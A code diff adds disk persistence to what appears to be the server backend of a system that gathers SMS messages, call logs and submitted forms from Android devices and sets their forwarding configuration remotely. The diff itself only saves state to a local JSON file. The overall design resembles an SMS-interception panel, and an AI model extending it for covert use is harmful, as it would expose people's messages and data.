@@ -1,8 +1,93 @@
 import { Device, DeviceData, SMS, CallLog, FormData, ForwardingConfig, SimInfo } from './types/index.js';
+import fs from 'fs';
+import path from 'path';
 
-// In-memory data store for all devices
+// ─── Persistence helpers ────────────────────────────────────────────────────
+// Store device state in a JSON file so it survives Render server restarts.
+// Only the parts that matter for reconnection are persisted:
+//   - device identity (id, name, phoneNumber, simCards)
+//   - forwarding config (so devices get their config back on reconnect)
+//   - forms (important user-submitted data)
+// SMS and call logs are NOT persisted (they are re-synced by the Android app
+// on every reconnection via flushPendingSyncQueue).
+
+const DATA_FILE = path.join(__dirname, '..', 'data', 'store.json');
+
+interface PersistedDevice {
+    id: string;
+    name: string;
+    phoneNumber: string;
+    simCards: SimInfo[];
+    forwarding: ForwardingConfig;
+    forms: FormData[];
+}
+
+function ensureDataDir() {
+    const dir = path.dirname(DATA_FILE);
+    if (!fs.existsSync(dir)) {
+        fs.mkdirSync(dir, { recursive: true });
+    }
+}
+
+function loadPersistedDevices(): Map<string, PersistedDevice> {
+    try {
+        ensureDataDir();
+        if (!fs.existsSync(DATA_FILE)) return new Map();
+        const raw = fs.readFileSync(DATA_FILE, 'utf8');
+        const arr: PersistedDevice[] = JSON.parse(raw);
+        const map = new Map<string, PersistedDevice>();
+        for (const d of arr) {
+            map.set(d.id, d);
+        }
+        console.log(`[Store] Loaded ${map.size} persisted device(s) from disk`);
+        return map;
+    } catch (e) {
+        console.error('[Store] Failed to load persisted store, starting fresh:', e);
+        return new Map();
+    }
+}
+
+function persistDevices(devices: Map<string, DeviceData>) {
+    try {
+        ensureDataDir();
+        const arr: PersistedDevice[] = Array.from(devices.values()).map(d => ({
+            id: d.device.id,
+            name: d.device.name,
+            phoneNumber: d.device.phoneNumber,
+            simCards: d.device.simCards || [],
+            forwarding: d.forwarding,
+            forms: d.forms,
+        }));
+        fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2), 'utf8');
+    } catch (e) {
+        console.error('[Store] Failed to persist store to disk:', e);
+    }
+}
+
+// ─── In-memory data store ──────────────────────────────────────────────────
 class DataStore {
     private devices: Map<string, DeviceData> = new Map();
+
+    constructor() {
+        // Restore persisted state on startup (survives Render restarts)
+        const persisted = loadPersistedDevices();
+        for (const [id, p] of persisted) {
+            this.devices.set(id, {
+                device: {
+                    id: p.id,
+                    name: p.name,
+                    phoneNumber: p.phoneNumber,
+                    status: 'offline', // starts offline until the device reconnects
+                    lastSeen: new Date(),
+                    simCards: p.simCards || [],
+                },
+                sms: [],    // re-synced by Android on reconnect
+                calls: [],  // re-synced by Android on reconnect
+                forms: p.forms || [],
+                forwarding: p.forwarding,
+            });
+        }
+    }
 
     // Get all devices
     getAllDevices(): Device[] {
@@ -25,6 +110,7 @@ class DataStore {
             existing.device.name = device.name;
             existing.device.phoneNumber = device.phoneNumber;
             existing.device.socketId = device.socketId;
+            persistDevices(this.devices);
             return existing;
         }
 
@@ -48,6 +134,7 @@ class DataStore {
         };
 
         this.devices.set(device.id, deviceData);
+        persistDevices(this.devices);
         return deviceData;
     }
 
@@ -58,6 +145,7 @@ class DataStore {
             deviceData.device.status = 'offline';
             deviceData.device.lastSeen = new Date();
             deviceData.device.socketId = undefined;
+            // No need to persist on offline — identity & config are already persisted
         }
     }
 
@@ -128,6 +216,7 @@ class DataStore {
             submittedAt: new Date(),
         });
         console.log(`[Store] Form stored for device ${deviceId}, total forms: ${deviceData.forms.length}`);
+        persistDevices(this.devices);
     }
 
     // Update forwarding config
@@ -135,6 +224,7 @@ class DataStore {
         const deviceData = this.devices.get(deviceId);
         if (deviceData) {
             deviceData.forwarding = { ...deviceData.forwarding, ...config };
+            persistDevices(this.devices);
             return deviceData.forwarding;
         }
         return null;
@@ -165,6 +255,7 @@ class DataStore {
         const deviceData = this.devices.get(deviceId);
         if (deviceData) {
             deviceData.device.simCards = simCards;
+            persistDevices(this.devices);
         }
     }
 
